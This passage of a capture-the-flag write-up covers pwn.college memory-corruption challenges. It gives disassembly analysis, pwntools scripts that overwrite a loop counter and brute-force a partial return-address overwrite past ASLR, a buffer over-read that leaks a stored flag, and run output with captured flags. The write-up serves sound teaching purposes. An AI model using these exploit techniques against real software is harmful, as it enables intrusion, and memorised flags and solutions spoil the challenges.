   0x000000000000163e <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001641 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001648 <+22>:    jne    0x174c <win_authed+282>
   0x000000000000164e <+28>:    lea    rdi,[rip+0x1a9b]        # 0x30f0
  
# ---- snip ----

   0x000000000000174c <+282>:   nop
   0x000000000000174d <+283>:   leave
   0x000000000000174e <+284>:   ret
End of assembler dump.
```

- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x164e`

Intbhis exploit we have to partially overwrite the return address.

### Partial return address overwrite

Even if ASLR is enabled, the last 3 nibbles are still fixed, as, in x86-64 a page is a 0x1000 byte slice of memory which is 0x1000 byte aligned.

In the disassembly, we saw that the address of the `win_authed()` function is at an offset of `0x164e` from the page start.
This means, the `ba5` part will be constant always.

Knowing this, we can keep the LSB constant as the last two nibbles will be accounted for in it.
However, in the second LSB, one nibble would be constant, and the other would vary.

```
## ASLR_BASE:                0x00005fda8a580000
## win_authed() offset:                  0x164e
=> Final address:            0x00005fda8a58164e

## ASLR_BASE:                0x00005fda8a581000
## win_authed() offset:                  0x164e
=> Final address:            0x00005fda8a58264e
```

If we overwrite the last two bytes of the return address, there is a chance that last two bytes will be the same as the offset of `win_authed()`.
Some brute-forcing will be required in this challenge.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Set target bytes here (based on win_authed_offset = 0x164e)
# The 0x16 part is a guess of the 4th nibble. It will work 1/16 times.
target_bytes = [0x4e, 0x16] 

attempt = 0

while True:
    attempt += 1
    p = process('/challenge/loop-lunacy-easy')
    
    # Optional: Uncomment the next line to see every byte exchanged
    # context.log_level = 'debug' 

    buffer_addr = 0x7ffc4f918380
    addr_of_saved_ip = 0x7ffc4f9183b8
    var_n_addr = 0x7ffc4f918398
    win_authed_offset = 0x164e

    total_offset = addr_of_saved_ip - buffer_addr
    var_n_offset = var_n_addr - buffer_addr
    jump = total_offset - var_n_offset
    payload_size = total_offset + 2

    print(f"[+] Attempt {attempt} | Target: {hex(target_bytes[1])}{hex(target_bytes[0])[2:]}")

    try:
        # 1. Provide size
        p.recvuntil(b'Payload size:', timeout=2)
        p.sendline(str(payload_size).encode())

        # 2. Skip to the loop
        p.recvuntil(b'0 bytes away', timeout=2)
        p.send(b"A")

        # 3. Fill up to the 'n' variable (offset 24)
        for i in range(1, var_n_offset):
            p.recvuntil(f"{i} bytes away".encode(), timeout=2)
            p.send(b"A")

        # 4. OVERWRITE 'n' to jump to Return Address (offset 56)
        # We send 55 because n += 1 happens after our write, making n=56
        p.recvuntil(b"24 bytes away", timeout=2)
        p.send(p8(total_offset - 1)) 

        # 5. OVERWRITE Return Address
        p.recvuntil(b"56 bytes away", timeout=2)
        p.send(p8(target_bytes[0])) # 0x4e
        
        p.recvuntil(b"57 bytes away", timeout=2)
        p.send(p8(target_bytes[1])) # 0x16 

        # 6. CRITICAL: Wait for the flag
        # We use a loop to check output so we don't close too early
        output = p.recvall(timeout=1).decode(errors="ignore")
        
        if "pwn.college{" in output:
            print("\n" + "="*30)
            print("[!!!] FLAG FOUND [!!!]")
            print(output)
            print("="*30)
            break
        
        if "Segmentation fault" in output:
            # This is actually GOOD news. It means you successfully 
            # redirected execution, but the 4th nibble guess was wrong.
            pass

    except EOFError:
        # Process died, likely a segfault from a wrong guess
        pass
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        p.close()
```

```
hacker@program-security~loop-lunacy-easy:/$ python ~/2_script.py 
[+] Starting local process '/challenge/loop-lunacy-easy': pid 42636
[+] Attempt 1 | Target: 0x164e
[+] Receiving all data: Done (2.35KB)
[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42636)
[+] Starting local process '/challenge/loop-lunacy-easy': pid 42639
[+] Attempt 2 | Target: 0x164e
[+] Receiving all data: Done (2.35KB)
[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42639)
[+] Starting local process '/challenge/loop-lunacy-easy': pid 42642
[+] Attempt 3 | Target: 0x164e
[+] Receiving all data: Done (2.35KB)
[*] Process '/challenge/loop-lunacy-easy' stopped with exit code -11 (SIGSEGV) (pid 42642)
[+] Starting local process '/challenge/loop-lunacy-easy': pid 42645
[+] Attempt 4 | Target: 0x164e
[+] Receiving all data: Done (2.44KB)
[*] Process '/challenge/loop-lunacy-easy' stopped with exit code 2 (pid 42645)

==============================
[!!!] FLAG FOUND [!!!]
 from the start of the input buffer.
You sent 58 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff071aa400 (rsp+0x0000) | a0 f6 79 8f 44 78 00 00 | 0x000078448f79f6a0 |
| 0x00007fff071aa408 (rsp+0x0008) | b8 b5 1a 07 ff 7f 00 00 | 0x00007fff071ab5b8 |
| 0x00007fff071aa410 (rsp+0x0010) | a8 b5 1a 07 ff 7f 00 00 | 0x00007fff071ab5a8 |
| 0x00007fff071aa418 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff071aa420 (rsp+0x0020) | 00 00 00 00 3a 00 00 00 | 0x0000003a00000000 |
| 0x00007fff071aa428 (rsp+0x0028) | 3a 00 00 00 00 00 00 00 | 0x000000000000003a |
| 0x00007fff071aa430 (rsp+0x0030) | 40 a4 1a 07 ff 7f 00 00 | 0x00007fff071aa440 |
| 0x00007fff071aa438 (rsp+0x0038) | 58 a4 1a 07 ff 7f 00 00 | 0x00007fff071aa458 |
| 0x00007fff071aa440 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff071aa448 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff071aa450 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff071aa458 (rsp+0x0058) | 3a 00 00 00 5a 55 00 00 | 0x0000555a0000003a |
| 0x00007fff071aa460 (rsp+0x0060) | b0 b4 1a 07 ff 7f 00 00 | 0x00007fff071ab4b0 |
| 0x00007fff071aa468 (rsp+0x0068) | 00 a0 f7 dc 9d 6b ef 42 | 0x42ef6b9ddcf7a000 |
| 0x00007fff071aa470 (rsp+0x0070) | b0 b4 1a 07 ff 7f 00 00 | 0x00007fff071ab4b0 |
| 0x00007fff071aa478 (rsp+0x0078) | 4e 16 da f1 5a 55 00 00 | 0x0000555af1da164e |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff071aa440
- the saved frame pointer (of main) is at 0x7fff071aa470
- the saved return address (previously to main) is at 0x7fff071aa478
- the saved return address is now pointing to 0x555af1da164e.
- the canary is stored at 0x7fff071aa468.
- the canary value is now 0x42ef6b9ddcf7a000.
- the address of the number of bytes read counter and read offset is 0x7fff071aa458.
- the address of win_authed() is 0x555af1da1632.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{8UNMXDMBHZ8DpL3em0nucajCFa5.0VNwMDL4ITM0EzW}
```

&nbsp;

## Loop Lunacy (Hard)

```
hacker@program-security~loop-lunacy-hard:/$ /challenge/loop-lunacy-hard 
###
### Welcome to /challenge/loop-lunacy-hard!
###

Payload size: 10
Send your payload (up to 10 bytes)!
aaaaaaaaaa
Goodbye!
### Goodbye!
```

For exploiting this challenge, we need the followin:
- [ ] Address of the buffer
- [ ] Address of variable `n`
- [ ] Location of stored return address to `main()`
- [ ] Offset of instruction within `win_authed()` which skips the authentication

### Binary Analysis


#### `win_authed()`

Let's get the offset of the required instruction first.

```
pwndbg> disassemble win_authed
Dump of assembler code for function win_authed:
   0x000000000000210c <+0>:     endbr64
   0x0000000000002110 <+4>:     push   rbp
   0x0000000000002111 <+5>:     mov    rbp,rsp
   0x0000000000002114 <+8>:     sub    rsp,0x10
   0x0000000000002118 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x000000000000211b <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000002122 <+22>:    jne    0x2226 <win_authed+282>
   0x0000000000002128 <+28>:    lea    rdi,[rip+0xed9]        # 0x3008
 
# ---- snip ----

   0x0000000000002226 <+282>:   nop
   0x0000000000002227 <+283>:   leave
   0x0000000000002228 <+284>:   ret
End of assembler dump.
```

- [ ] Address of the buffer
- [ ] Address of variable `n`
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`


#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000002229 <+0>:     endbr64
   0x000000000000222d <+4>:     push   rbp
   0x000000000000222e <+5>:     mov    rbp,rsp
   0x0000000000002231 <+8>:     sub    rsp,0xc0
   0x0000000000002238 <+15>:    mov    DWORD PTR [rbp-0xa4],edi
   0x000000000000223e <+21>:    mov    QWORD PTR [rbp-0xb0],rsi
   0x0000000000002245 <+28>:    mov    QWORD PTR [rbp-0xb8],rdx
   0x000000000000224c <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000002255 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000002259 <+48>:    xor    eax,eax
   0x000000000000225b <+50>:    lea    rdx,[rbp-0x80]
   0x000000000000225f <+54>:    mov    eax,0x0
   0x0000000000002264 <+59>:    mov    ecx,0xe
   0x0000000000002269 <+64>:    mov    rdi,rdx
   0x000000000000226c <+67>:    rep stos QWORD PTR es:[rdi],rax
   0x000000000000226f <+70>:    lea    rax,[rbp-0x80]
   0x0000000000002273 <+74>:    mov    QWORD PTR [rbp-0x90],rax
   0x000000000000227a <+81>:    lea    rax,[rbp-0x80]
   0x000000000000227e <+85>:    add    rax,0x6c
   0x0000000000002282 <+89>:    mov    QWORD PTR [rbp-0x88],rax
   0x0000000000002289 <+96>:    mov    QWORD PTR [rbp-0x98],0x0
   0x0000000000002294 <+107>:   lea    rdi,[rip+0xe71]        # 0x310c
   0x000000000000229b <+114>:   mov    eax,0x0
   0x00000000000022a0 <+119>:   call   0x1160 <printf@plt>
   0x00000000000022a5 <+124>:   lea    rax,[rbp-0x98]
   0x00000000000022ac <+131>:   mov    rsi,rax
   0x00000000000022af <+134>:   lea    rdi,[rip+0xe65]        # 0x311b
   0x00000000000022b6 <+141>:   mov    eax,0x0
   0x00000000000022bb <+146>:   call   0x11b0 <__isoc99_scanf@plt>
   0x00000000000022c0 <+151>:   mov    rax,QWORD PTR [rbp-0x98]
   0x00000000000022c7 <+158>:   mov    rsi,rax
   0x00000000000022ca <+161>:   lea    rdi,[rip+0xe4f]        # 0x3120
   0x00000000000022d1 <+168>:   mov    eax,0x0
   0x00000000000022d6 <+173>:   call   0x1160 <printf@plt>
   0x00000000000022db <+178>:   jmp    0x231b <challenge+242>
   0x00000000000022dd <+180>:   mov    rax,QWORD PTR [rbp-0x88]
   0x00000000000022e4 <+187>:   mov    eax,DWORD PTR [rax]
   0x00000000000022e6 <+189>:   movsxd rdx,eax
   0x00000000000022e9 <+192>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000000022f0 <+199>:   add    rax,rdx
   0x00000000000022f3 <+202>:   mov    edx,0x1
   0x00000000000022f8 <+207>:   mov    rsi,rax
   0x00000000000022fb <+210>:   mov    edi,0x0
   0x0000000000002300 <+215>:   call   0x1180 <read@plt>
   0x0000000000002305 <+220>:   mov    rdx,QWORD PTR [rbp-0x88]
   0x000000000000230c <+227>:   mov    edx,DWORD PTR [rdx]
   0x000000000000230e <+229>:   add    eax,edx
   0x0000000000002310 <+231>:   mov    edx,eax
   0x0000000000002312 <+233>:   mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000002319 <+240>:   mov    DWORD PTR [rax],edx
   0x000000000000231b <+242>:   mov    rax,QWORD PTR [rbp-0x88]
   0x0000000000002322 <+249>:   mov    eax,DWORD PTR [rax]
   0x0000000000002324 <+251>:   movsxd rdx,eax
   0x0000000000002327 <+254>:   mov    rax,QWORD PTR [rbp-0x98]
   0x000000000000232e <+261>:   cmp    rdx,rax
   0x0000000000002331 <+264>:   jb     0x22dd <challenge+180>
   0x0000000000002333 <+266>:   mov    rax,QWORD PTR [rbp-0x88]
   0x000000000000233a <+273>:   mov    eax,DWORD PTR [rax]
   0x000000000000233c <+275>:   mov    DWORD PTR [rbp-0x9c],eax
   0x0000000000002342 <+281>:   cmp    DWORD PTR [rbp-0x9c],0x0
   0x0000000000002349 <+288>:   jns    0x2377 <challenge+334>
   0x000000000000234b <+290>:   call   0x1120 <__errno_location@plt>
   0x0000000000002350 <+295>:   mov    eax,DWORD PTR [rax]
   0x0000000000002352 <+297>:   mov    edi,eax
   0x0000000000002354 <+299>:   call   0x11d0 <strerror@plt>
   0x0000000000002359 <+304>:   mov    rsi,rax
   0x000000000000235c <+307>:   lea    rdi,[rip+0xde5]        # 0x3148
   0x0000000000002363 <+314>:   mov    eax,0x0
   0x0000000000002368 <+319>:   call   0x1160 <printf@plt>
   0x000000000000236d <+324>:   mov    edi,0x1
   0x0000000000002372 <+329>:   call   0x11c0 <exit@plt>
   0x0000000000002377 <+334>:   lea    rdi,[rip+0xdee]        # 0x316c
   0x000000000000237e <+341>:   call   0x1130 <puts@plt>
   0x0000000000002383 <+346>:   mov    eax,0x0
   0x0000000000002388 <+351>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000000238c <+355>:   xor    rcx,QWORD PTR fs:0x28
   0x0000000000002395 <+364>:   je     0x239c <challenge+371>
   0x0000000000002397 <+366>:   call   0x1150 <__stack_chk_fail@plt>
   0x000000000000239c <+371>:   leave
   0x000000000000239d <+372>:   ret
End of assembler dump.
```

We can see that the buffer is at `rbp-0x80` based on these instructions where the program clears the buffer.

```
# ---- snip ----

   0x0000000000002259 <+48>:    xor    eax,eax
   0x000000000000225b <+50>:    lea    rdx,[rbp-0x80]
   0x000000000000225f <+54>:    mov    eax,0x0
   0x0000000000002264 <+59>:    mov    ecx,0xe
   0x0000000000002269 <+64>:    mov    rdi,rdx
   0x000000000000226c <+67>:    rep stos QWORD PTR es:[rdi],rax

# ---- snip ----
```

- [x] Address of the buffer: `rbp-0x80`
- [ ] Address of variable `n`
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`

Further in the program, there is this part:

```
# ---- snip ----

   0x000000000000227a <+81>:    lea    rax,[rbp-0x80]
   0x000000000000227e <+85>:    add    rax,0x6c
   0x0000000000002282 <+89>:    mov    QWORD PTR [rbp-0x88],rax

# ---- snip ----   

   0x00000000000022dd <+180>:   mov    rax,QWORD PTR [rbp-0x88]
   0x00000000000022e4 <+187>:   mov    eax,DWORD PTR [rax]
   0x00000000000022e6 <+189>:   movsxd rdx,eax
   0x00000000000022e9 <+192>:   mov    rax,QWORD PTR [rbp-0x90]
   0x00000000000022f0 <+199>:   add    rax,rdx
   0x00000000000022f3 <+202>:   mov    edx,0x1
   0x00000000000022f8 <+207>:   mov    rsi,rax
   0x00000000000022fb <+210>:   mov    edi,0x0
   0x0000000000002300 <+215>:   call   0x1180 <read@plt>

# ---- snip ----
```

The program takes the address of the memory location `rbp-0x80+0x6c` and stores that address into `rbp-0x88`.

Then for the `read@plt` call, it does the following:
- `mov rax, QWORD PTR [rbp-0x88]`: It gets the address of the counter, which is `rbp-0x14`, from it's pointer at `rbp-0x88`.
- `mov eax, DWORD PTR [rax]`: It then gets the count from the counter at `rbp-0x14`. (This is your variable `n`).
- `add rax, rdx:` It adds that counter value to the buffer start to find the exact spot for the read call.

This tells us that the location of `n` is `rbp-0x80+0x6c` i.e. `rbp-0x14`.

- [x] Address of the buffer:: `rbp-0x80`
- [x] Address of variable `n`: `rbp-0x14`
- [x] Location of stored return address to `main()`: `rbp-0x8`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Based on your win_authed_offset = 0x2128
target_bytes = [0x28, 0x21] 

attempt = 0

while True:
    attempt += 1
    # Update binary path to hard mode
    p = process('/challenge/loop-lunacy-hard')
    
    # Updated hardcoded addresses from your prompt
    buffer_addr = - 0x80      # rbp - 128
    var_n_addr = - 0x14      # rbp - 20 (This is -0x80 + 0x6c)
    addr_of_saved_ip = 0x8   # rbp + 8
    
    # Calculate distances
    # Note: if var_n_addr < buffer_addr, the offset is negative!
    # Python's p8() handles signed integers, but let's calculate carefully.
    total_offset = addr_of_saved_ip - buffer_addr
    var_n_offset = var_n_addr - buffer_addr
    payload_size = total_offset + 2

    print(f"[+] Attempt {attempt} | Offsets: n={var_n_offset}, ret={total_offset}")

    try:
        # 1. Provide size
        p.recvuntil(b'Payload size:', timeout=2)
        p.sendline(str(payload_size).encode())

        # 2. Wait for the start signal
        p.recvuntil(b'Send your payload', timeout=2)

        # 3. Handle negative offsets if necessary
        # If var_n is BEFORE the buffer (common in 'hard'), 
        # the program might start at n=0.
        # We need to send exactly (var_n_offset) bytes to reach 'n'.
        # However, if var_n is at a negative offset, you likely need 
        # to enter a payload size that wraps around or use a specific starting 'n'.
        
        # ASSUMING n starts at 0 and we need to reach var_n_offset:
        # Fill everything up to 'n'
        p.send(b"A" * var_n_offset)

        # 4. OVERWRITE 'n' to jump to Return Address
        # We send the byte that makes the NEXT read happen at total_offset
        p.send(p8(total_offset - 1)) 

        # 5. OVERWRITE Return Address
        # Immediately send the target bytes. The program will read these
        # as soon as it updates 'n' to the total_offset value.
        p.send(p8(target_bytes[0])) 
        p.send(p8(target_bytes[1])) 

        # 6. Wait for the flag
        output = p.recvall(timeout=1).decode(errors="ignore")
        
        if "pwn.college{" in output:
            print("\n" + "="*30)
            print("[!!!] FLAG FOUND [!!!]")
            print(output)
            print("="*30)
            break

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        p.close()
```

```
hacker@program-security~loop-lunacy-hard:/$ python ~/2_script.py 
[+] Starting local process '/challenge/loop-lunacy-hard': pid 25159
[+] Attempt 1 | Offsets: n=108, ret=136
[+] Receiving all data: Done (29B)
[*] Process '/challenge/loop-lunacy-hard' stopped with exit code -11 (SIGSEGV) (pid 25159)
[+] Starting local process '/challenge/loop-lunacy-hard': pid 25162

# ---- snip ----

[+] Attempt 13 | Offsets: n=108, ret=136
[+] Receiving all data: Done (116B)
[*] Process '/challenge/loop-lunacy-hard' stopped with exit code 2 (pid 25195)

==============================
[!!!] FLAG FOUND [!!!]
 (up to 138 bytes)!
Goodbye!
You win! Here is your flag:
pwn.college{UokbkvbtuMwdJiQwJAWD0ItCYFx.0lNwMDL4ITM0EzW}
```

&nbsp;

## Nosy Neighbor (Easy)

```
hacker@program-security~nosy-neighbor-easy:/$ /challenge/nosy-neighbor-easy 
###
### Welcome to /challenge/nosy-neighbor-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fffeec29450 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29458 (rsp+0x0008) | 48 a7 c2 ee ff 7f 00 00 | 0x00007fffeec2a748 |
| 0x00007fffeec29460 (rsp+0x0010) | 38 a7 c2 ee ff 7f 00 00 | 0x00007fffeec2a738 |
| 0x00007fffeec29468 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fffeec29470 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29478 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29480 (rsp+0x0030) | 90 94 c2 ee ff 7f 00 00 | 0x00007fffeec29490 |
| 0x00007fffeec29488 (rsp+0x0038) | f3 94 c2 ee ff 7f 00 00 | 0x00007fffeec294f3 |
| 0x00007fffeec29490 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29498 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294b0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294b8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294c0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294c8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294d0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294d8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294e0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294e8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294f0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec294f8 (rsp+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29500 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29508 (rsp+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29510 (rsp+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29518 (rsp+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29520 (rsp+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29528 (rsp+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29530 (rsp+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29538 (rsp+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29540 (rsp+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29548 (rsp+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29550 (rsp+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29558 (rsp+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29560 (rsp+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29568 (rsp+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29570 (rsp+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29578 (rsp+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29580 (rsp+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29588 (rsp+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29590 (rsp+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec29598 (rsp+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295a0 (rsp+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295a8 (rsp+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295b0 (rsp+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295b8 (rsp+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295c0 (rsp+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295c8 (rsp+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295d0 (rsp+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295d8 (rsp+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295e0 (rsp+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295e8 (rsp+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fffeec295f0 (rsp+0x01a0) | 00 00 00 ee ff 7f 00 00 | 0x00007fffee000000 |
| 0x00007fffeec295f8 (rsp+0x01a8) | 00 41 89 03 37 8c b0 82 | 0x82b08c3703894100 |
| 0x00007fffeec29600 (rsp+0x01b0) | 40 a6 c2 ee ff 7f 00 00 | 0x00007fffeec2a640 |
| 0x00007fffeec29608 (rsp+0x01b8) | 42 32 2c 01 ef 5a 00 00 | 0x00005aef012c3242 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fffeec29450, and our base pointer points to 0x7fffeec29600.
This means that we have (decimal) 56 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 448 bytes.
The input buffer begins at 0x7fffeec29490, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 99 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, the flag will be loaded into memory.
However, at no point will this program actually print the buffer storing the flag.
Payload size: 2
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7fffeec29490 (the start of the input buffer)
right up to (but not including) 0x7fffeec29492 (which is -97 bytes beyond the end of the buffer).
Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
The program's memory status:
- the input buffer starts at 0x7fffeec29490
- the saved frame pointer (of main) is at 0x7fffeec29600
- the saved return address (previously to main) is at 0x7fffeec29608
- the saved return address is now pointing to 0x5aef012c3242.
- the canary is stored at 0x7fffeec295f8.
- the canary value is now 0x82b08c3703894100.
- the address of the flag is 0x7fffeec294f3.

You said: aa
Goodbye!
### Goodbye!
```

The solution to this challenge is pretty easy.

If we look at the addresses we have been provided with, we can see that the flag sits between the buffer and the stored return address. 

```py title"~/script.py" showLineNumbers
buffer_addr = 0x7ffd7c4a00e0
canary_addr = 0x7ffd7c4a0248
ret_addr = 0x7ffd7c4a0258
flag_addr = 0x7ffd7c4a0143

flag_dist = flag_addr - buffer_addr
canary_dist = canary_addr - buffer_addr
ret_dist = ret_addr - buffer_addr

print(f"Flag dist: {flag_dist}")
print(f"Canary dist: {canary_dist}")
print(f"Return dist: {ret_dist}")
```

```
hacker@program-security~nosy-neighbor-easy:/$ python ~/script.py 
Flag dist: 99
Canary dist: 360
Return dist: 376
```

### Buffer Over-read

This means, we do not have to overflow the buffer at all. Our payload just has to touch the stored flag, and then `printf` will read the entire string from the start of our buffer until it finds a `\x00` byte, which will be after the flag.

So, it will print out the flag as well for us.

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/nosy-neighbor-easy')

# Initialize values
buffer_addr = 0x7ffd7c4a00e0
flag_addr = 0x7ffd7c4a0143

# Calculate offset & payload_size
offset = flag_addr - buffer_addr
payload_size = offset

# Build payload
payload = b"A" * offset

# Send payload size
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size).encode())

# Send payload
p.recvuntil(b'bytes)!')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~nosy-neighbor-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/nosy-neighbor-easy': pid 43439
[*] Switching to interactive mode

[*] Process '/challenge/nosy-neighbor-easy' stopped with exit code 0 (pid 43439)
You sent 99 bytes!
The program's memory status:
- the input buffer starts at 0x7ffdf25c3520
- the saved frame pointer (of main) is at 0x7ffdf25c3690
- the saved return address (previously to main) is at 0x7ffdf25c3698
- the saved return address is now pointing to 0x5a06c7f98242.
- the canary is stored at 0x7ffdf25c3688.
- the canary value is now 0xe7737175eb0e8e00.
- the address of the flag is 0x7ffdf25c3583.

You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn.college{o7qHRXYqxzUogFkCRk_p8XP5YEH.01NwMDL4ITM0EzW}

Goodbye!
### Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Nosy Neighbor (Hard)

```
hacker@program-security~nosy-neighbor-hard:/$ /challenge/nosy-neighbor-hard 
###
### Welcome to /challenge/nosy-neighbor-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You said: aa
Goodbye!
### Goodbye!
```

We will need the following for crafting an exploit:

- [ ] Location of buffer
- [ ] Location of flag

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  __errno_location@plt
0x0000000000001110  puts@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  read@plt
0x0000000000001150  setvbuf@plt
0x0000000000001160  open@plt
0x0000000000001170  __isoc99_scanf@plt
0x0000000000001180  exit@plt
0x0000000000001190  strerror@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
